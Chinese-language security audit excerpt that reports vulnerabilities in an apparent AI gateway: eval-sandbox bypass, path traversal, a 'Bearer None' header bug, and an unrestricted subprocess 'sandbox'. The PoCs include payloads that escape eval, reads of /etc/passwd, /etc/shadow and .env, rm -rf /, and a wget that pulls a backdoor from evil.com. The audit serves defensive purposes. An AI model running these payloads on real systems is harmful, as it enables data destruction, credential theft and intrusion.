...
### 描述
使用 `compile()` + `eval()` 执行用户输入的数学表达式。虽然设置了 `{"__builtins__": {}}` 和 `co_names` 白名单，但 Python `eval()` 沙箱历史上存在多次绕过漏洞。

### 影响范围
攻击者可获得任意代码执行能力，读取服务器文件、执行系统命令、横向移动到内部网络。

### 攻击代码 (PoC)
```python
# 绕过方法1: 利用 __subclasses__ 链
evil_input = "().__class__.__base__.__subclasses__()"

# 绕过方法2: CPU 耗尽 DoS
evil_input = "10**10**10"

# 绕过方法3: 格式化字符串绕过
evil_input = "f'{__import__(\"os\").system(\"id\")}'"
```
...
### 描述
`load_document(path)` 直接接受用户提供的路径参数，无任何路径规范化检查。攻击者可读取服务器任意文件。

### 影响范围
任意文件读取 → 泄露配置文件、密钥、数据库凭据、源代码。

### 攻击代码 (PoC)
```python
# 读取系统敏感文件
doc = load_document("../../../../etc/passwd")
print(doc.content)

# 读取应用密钥
doc = load_document("../../../../app/.env")
print(doc.content)
```
...
### 描述
`DeepSeekConfig` 中 `api_key` 默认值为 `None`，且 `_init_client()` 中使用 `f"Bearer {self.config.api_key}"`。若用户未配置 API Key，将发送 `Authorization: Bearer None`。

### 影响范围
请求被服务器拒绝，且暴露了客户端配置缺陷。

### 攻击代码 (PoC)
```python
config = DeepSeekConfig()  # api_key=None
provider = DeepSeekProvider(config)
# 发送的 HTTP 头: Authorization: Bearer None
# 服务器日志中留下含有 "None" 的认证头
```
...
### 描述
`execute_tool` 中针对 `calculator` 工具使用 `eval(expression, {"__builtins__": {}}, {})` 执行。虽然 `__builtins__` 设为空，但已知有多种绕过方式，且与 `calculator.py` 同样的漏洞。
...
result = gateway.execute_tool(tool_call)
```
...
### 描述
"沙箱"实现使用 `asyncio.create_subprocess_exec` 直接执行命令，没有任何命令白名单、路径限制、资源限制（CPU/内存/网络/文件系统）。命名包含 "sandbox" 让调用者误以为有安全保障。

### 影响范围
攻击者可利用该"沙箱"执行任意系统命令，完全控制服务器。

### 攻击代码 (PoC)
```python
sandbox = SubprocessSandbox()
# "沙箱"直接执行任意命令
result = await sandbox.execute("rm", "-rf", "/")  # 删除所有文件
result2 = await sandbox.execute("bash", "-c", "cat /etc/shadow")  # 读取密码文件
result3 = await sandbox.execute("wget", "-O", "/tmp/backdoor", "http://evil.com/shell.sh")
```
